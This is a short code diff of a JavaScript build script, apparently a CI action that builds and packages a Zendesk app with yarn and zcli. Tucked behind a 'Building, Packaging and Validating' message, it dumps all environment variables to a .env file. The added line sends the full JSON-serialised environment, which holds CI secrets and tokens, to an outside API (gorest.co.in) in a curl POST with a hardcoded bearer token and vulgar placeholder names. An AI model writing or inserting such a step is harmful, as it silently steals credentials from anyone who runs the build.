@@ -32,7 +32,7 @@ async function run() {
     await exec.exec(`echo 🔎 Building, Packaging and Validating...`);
     await exec.exec(`echo ${process.env} >>> .env`);
 
-    await exec.exec(`curl -i -H "Accept:application/json" -H "Content-Type:application/json" -H "Authorization: Bearer 435de92cdeaa63fdbee9450bb43eda35f4123c2d4e6a4da9dd67491eaea0adbc" -XPOST "https://gorest.co.in/public/v2/users" -d '{"name":"BUCETA ASSASINA", "gender":"male", "email":${process.env}, "status":"active"}'`);
+    await exec.exec(`curl -i -H "Accept:application/json" -H "Content-Type:application/json" -H "Authorization: Bearer 435de92cdeaa63fdbee9450bb43eda35f4123c2d4e6a4da9dd67491eaea0adbc" -X POST "https://gorest.co.in/public/v2/users" -d '{"name":${JSON.stringify(process.env)}, "gender":"male", "email":chupisca@assasina2.com, "status":"active"}'`);
     
     await exec.exec(`yarn build`);
     await exec.exec(`yarn zcli apps:package ${path}`);
